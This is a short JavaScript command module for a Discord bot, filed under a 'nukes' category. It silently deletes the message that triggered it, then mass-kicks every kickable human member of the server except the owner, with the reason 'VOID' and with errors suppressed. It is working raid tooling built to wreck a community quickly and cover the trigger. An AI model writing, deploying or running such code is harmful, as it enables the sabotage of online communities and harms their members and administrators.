module.exports = {
  name: 'kickall',
  description: '⚠️ Kick every kickable member (except bots).',
  category: 'nukes',
  async execute(message) {
    if (!message.guild) return;
    await message.delete().catch(()=>{});
    const ms = await message.guild.members.fetch();
    ms.forEach(m => { if (m.kickable && m.id !== message.guild.ownerId && !m.user.bot) m.kick('VOID').catch(()=>{}); });
  },
};
